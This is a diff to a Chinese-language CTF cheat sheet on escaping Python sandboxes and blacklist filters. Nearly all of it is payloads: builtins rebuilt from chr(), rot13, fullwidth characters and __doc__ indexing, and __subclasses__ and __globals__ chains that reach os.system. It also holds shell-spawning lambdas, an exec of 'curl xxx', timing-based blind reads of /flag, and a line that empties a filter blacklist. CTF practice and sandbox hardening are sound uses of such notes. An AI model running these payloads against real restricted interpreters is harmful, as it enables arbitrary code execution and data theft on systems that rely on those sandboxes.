@@ -170,9 +170,28 @@ open('1.txt').read()
 'sys'+'tem' => 'system'
 '__imp'+'ort__' => '__import__'
 ''.join(['__imp','ort__']) => '__import__'
+
+#下划线被过滤
 dir()[0] => '_'
+也可以使用对应的全角字符进行替换：
+＿
+第一个字符不能为全角，否则会报错：
+>>> print(_＿name_＿)
+__main__
+>>> print(＿＿name_＿)
+  File "<stdin>", line 1
+    print(＿＿name_＿)
+          ^
+SyntaxError: invalid character '＿' (U+FF3F)
+
+
+#chr()函数构造
 eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) => __import__("os")
+
+
+#bytes 函数
 bytes([46, 47, 102, 108, 97, 103]).decode() => './flag'
+
 
 #编码绕过
 >>> import base64
@@ -207,21 +226,90 @@ kali
 >>> exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
 kali
 
+
+#替换绕过
 '__buihf9ns__'.replace('hf9','ldi') => '__buildins__'
 
 
+#rot13编码绕过
 import codecs
 getattr(os,codecs.encode("flfgrz",'rot13'))('ifconfig')
+
 
 #unicode字符 / Non-ASCII Identifies
 # 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳
 # 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫
 
+
 #清空
 setattr(__import__("__main__"), "blacklist", list())
 
+
 #过滤eval
 exec("import os;os.system('curl xxx')")
+
+
+### `__globals__` 替换
+''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
+''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals
+''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")
+
+
+### `__mro__`、`__bases__`、`__base__`互换
+三者之间可以相互替换
+''.__class__.__mro__[2]
+[].__class__.__mro__[1]
+{}.__class__.__mro__[1]
+().__class__.__mro__[1]
+[].__class__.__mro__[-1]
+{}.__class__.__mro__[-1]
+().__class__.__mro__[-1]
+{}.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+[].__class__.__base__
+().__class__.__base__
+{}.__class__.__base__
+
+
+#过滤运算符
+
+== 用 in 来替换
+or 可以用| + -...-来替换
+e.g:
+for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
+    ans = i[0]==i[1] or i[2]==i[3]
+    print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)
+    print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)
+    print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)
+    
+and 可以用& *替代
+for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
+    ans = i[0]==i[1] and i[2]==i[3]
+    print(bool(eval(f'{i[0]==i[1]} & {i[2]==i[3]}')) == ans)
+    print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)
+    
+    
+#过滤空格
+通过 ()、[] 替换
+
+
+#过滤()
+1.利用装饰器 @
+2.利用魔术方法，例如 enum.EnumMeta.__getitem__
+
+
+#过滤[]
+1.调用__getitem__()函数直接替换；
+2.调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；
+''.__class__.__mro__[-1].__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
+# __getitem__()替换中括号[]
+''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('ls')
+# pop()替换中括号[]，结合__getitem__()利用
+''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(200).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('ls')
+
+getattr(''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__,'__builtins__').__getitem__('__import__')('os').system('ls')
+
 
 #过滤数字
 0=False
@@ -229,15 +317,49 @@ exec("import os;os.system('curl xxx')")
 2=True+True=True-(-True)
 3=True+True+True=True-(-True)-(-True)
 
+也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。
+>>> len(repr(True))
+4
+>>> len(repr(bytearray))
+19
+
+可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现
+0 -> len([])
+2 -> len(list(dict(aa=()))[len([])])
+3 -> len(list(dict(aaa=()))[len([])])
+
+
 #过滤request
 #字符串request:
 list(globals().keys())[11]
 #request值：
 globals()[list(globals().keys())[11]]
 
+
 #过滤引号
 chr(123)
 str()
+
+
+#eval + list + dict 绕过内建函数过滤
+>>> eval(list(dict(s_t_r=1))[0][::2])
+<class 'str'>
+
+
+ #过滤. 和 ，获取函数
+通过点号来进行调用__import__('binascii').a2b_base64
+通过 getattr 函数：getattr(__import__('binascii'),'a2b_base64')
+ #, 号和 . 都被过滤
+1.内建函数可以使用eval(list(dict(s_t_r=1))[0][::2]) 这样的方式获取。
+2.模块内的函数可以先使用 __import__ 导入函数，然后使用 vars() j进行获取：
+>>> vars(__import__('binascii'))['a2b_base64']
+<built-in function a2b_base64>
+
+
+#__doc__获取字符
+__doc__ 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：
+().__doc__.find('s')
+().__doc__[19]+().__doc__[86]+().__doc__[19]
 
 
 #盲注
@@ -245,15 +367,15 @@ time.sleep(3) if open('/flag').read()[0]=='c' else 1
 flag.index('flag{...')
 type(flag.split())(type(flag.split())(flag).pop({..}).encode()).remove({..})
 
+
 #其他技巧
 eval(input())
-breakpoint() #调试模式
-help()
 (lambda:os.system('/bin/sh'))()
 (__builtins__:=__import__('os'))and(lambda:system)()('sh') #过滤点
 setattr(copyright,'__dict__',globals()),delattr(copyright,'breakpoint'),breakpoint()
 [*open("flag"+chr(46)+"txt")] #open未过滤，read过滤
 raise Exception(flag) #报错外带
+
 
 #修饰符
 @exec
@@ -261,6 +383,10 @@ raise Exception(flag) #报错外带
 class A:
     pass
 ```
+
+### getattr 函数
+
+内置函数，用于获取一个对象的属性或者方法。
 
 
 
